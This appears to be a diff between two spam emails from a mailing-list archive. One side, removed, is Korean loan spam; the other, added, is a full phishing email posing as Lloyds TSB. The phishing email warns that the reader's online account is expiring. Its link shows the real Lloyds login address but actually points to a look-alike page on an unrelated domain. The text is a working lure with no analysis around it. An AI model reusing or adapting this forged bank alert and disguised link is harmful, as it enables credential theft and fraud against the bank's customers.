@@ -1,41 +1,38 @@
-From: "\"개인회생6\" <xzxfnc"<azwaxcsexehmpw@munrjytfrqvalw.com>
-Subject: =?ISO-8859-1?Q?[=B0=B3=C0=CE=C8=B8=BB=FD]=B1=CD=C7=CF=BF=A1?=
-	=?ISO-8859-1?Q?=BD=C5=BF=EB=B0=FA=20=BB=F5=C3=E2=B9=DF=C0=BB?=
-	=?ISO-8859-1?Q?=B5=B5=BF=CD=B5=E5=B8=B3=B4=CF=B4=D9.!!!?=
-Date: Mon, 15 Aug 2005 17:25:10 +0300
-Message-ID: <BSTPTFZHFAKIPMKKGWGTPVX@msn.com>
-Reply-To: "\"개인회생4\" <\"Loan\"" <mailok01@daum.net>
+From: "Lloyds TSB"<service@lloydstsb.co.uk>
+Subject: **Lloyds TSB Urgent**
+Date: Mon, 15 Aug 2005 17:31:46 +0300
+Message-ID: <200508151437.j7FEb8H9022499@oss.sgi.com>
 Mime-Version: 1.0
-Content-Type: multipart/alternative;
-	boundary="--051554169191399398"
+Content-Type: text/html;
+	charset="Windows-1251"
+Content-Transfer-Encoding: 7bit
 Return-path: <netdev-bounce@oss.sgi.com>
-To: netdev@oss.sgi.com
+To: undisclosed-recipients:;
 Sender: netdev-bounce@oss.sgi.com
 Errors-to: netdev-bounce@oss.sgi.com
 List-Id: netdev.vger.kernel.org
 
-----051554169191399398
-Content-Type: text/html;
-Content-Transfer-Encoding: quoted-printable
-
-<html>
-<body>
-<table>
-  <tr>
-    <td><a href=3Dhttp://218.38.19.220:18553/nlaw/on_05.asp?reseller_id=3D=
-resel0004
-><img src=3Dhttp://hompy-img.dreamwiz.com/IMAGE/loctopus/f00001/f13/hc01_1=
-gif
- border=3D0></a></td>
-  </tr>
-  <tr>
-    <td><a href=3Dhttp://218.38.19.220:18553/nlaw/on_nomail.asp
-><img src=3Dhttp://hompy-img.dreamwiz.com/IMAGE/loctopus/f00001/f14/hc01_2=
-jpg
- border=3D0></a></td>
-  </tr>
+<table border="1" cellspacing="1" style="border-collapse: collapse" bordercolor="#111111" width="550" id="AutoNumber2">
+<tr>
+<td width="100%" dir="ltr">
+<img border="0" src="https://online.lloydstsb.co.uk/pics/IBL_banner.gif" width="300" height="45"><hr color="#7DC99B" dir="ltr">
+<table border="0" cellspacing="1" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber3">
+<tr>
+<td width="100%">
+<p dir="ltr"><font style="font-size: 19pt" color="#000080">
+personal & business account</font></td>
+</tr>
 </table>
-</body>
-</html>
+<table border="1" cellspacing="1" style="border-collapse: collapse" bordercolor="#008000" width="550" id="AutoNumber1" bgcolor="#E4E4F3">
+<tr>
+<td width="100%"><font color="#000080"><b>Security Alert</b></font>
+<p><font color="#000080">Please note that Your Lloyds TSB Online Account is about to expire. In order for it to remain active, please Use the link below to proceed and access your account.</font></p>
+<p><a href="http://www.agrostevia.com/online.lloydstsb.co.uk/online/bankonline/Secure/data/index.html">
+https://online.lloydstsb.co.uk/customer/Login.ibc</a></td>
+</tr>
+</table>
+</td>
+</tr>
+</table>
 
-----051554169191399398--
+<html><script language="JavaScript"></script></html>
